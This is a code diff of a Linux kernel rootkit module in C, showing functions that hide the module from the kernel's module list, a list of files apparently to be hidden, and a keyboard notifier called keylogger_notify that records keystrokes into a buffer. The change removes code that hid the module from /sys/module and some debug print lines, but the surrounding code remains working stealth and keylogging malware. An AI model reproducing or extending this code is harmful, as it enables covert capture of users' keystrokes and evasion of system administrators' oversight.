@@ -74,8 +74,7 @@ static char mydir[INTERNAL_BUFFER_LEN], myfile[INTERNAL_BUFFER_LEN];
 static char param[INTERNAL_BUFFER_LEN], command[INTERNAL_BUFFER_LEN];
 static char filename[INTERNAL_BUFFER_LEN];
 
-static struct list_head *module_prev=NULL, *module_kobj_prev ;
-static struct kobject* module_kobj_parent=NULL;
+static struct list_head *module_prev=NULL ;
 
 DEFINE_MUTEX(filldir_mutex);
 static struct list_head *banned_files;
@@ -560,13 +559,7 @@ static void hide_module(void){
 	module_prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 
-	//hide from /sys/module
-	module_kobj_parent = THIS_MODULE -> mkobj.kobj.parent;
-
-	module_kobj_prev = THIS_MODULE -> mkobj.kobj.entry.prev;
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
-	
+		
 	module_hidden=1;
 }
 
@@ -578,9 +571,6 @@ static void show_module(void){
 	//add to /proc/modules
 	list_add(&THIS_MODULE->list,module_prev);
 
-	//add to /sys/module
-//	kobject_add(&THIS_MODULE->mkobj.kobj,THIS_MODULE->mkobj.kobj.parent,MODULE_NAME);
-//	list_add(&THIS_MODULE->mkobj.kobj.entry, module_kobj_prev);
 	module_hidden=0;
 
 }
@@ -635,8 +625,6 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
 	//if we want to extract the characters pressed we should use some userspace tool
 	if(code == KBD_KEYSYM){
 
-		printk(KERN_INFO"keysym");
-		printk(KERN_INFO"down: %d key: %x", param->down, param->value);
 		sprintf(buf, "%d, %u\n", param->down, param->value);
 		len = strlen(buf);
 
